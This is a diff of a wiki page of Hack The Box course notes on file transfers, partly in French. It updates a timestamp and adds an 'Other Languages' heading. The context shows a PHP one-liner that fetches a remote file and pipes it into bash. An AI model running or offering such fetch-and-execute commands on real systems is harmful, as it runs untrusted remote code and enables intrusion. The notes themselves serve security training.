@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-04-21T12:00:28.400Z
+date: 2025-04-21T12:00:39.014Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -546,4 +546,6 @@ Par exemple pour exécuter le contenu du fichier avec Bash:
 ```
 php -r '$lines = @file("<uri>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
+
+### Other Languages
 
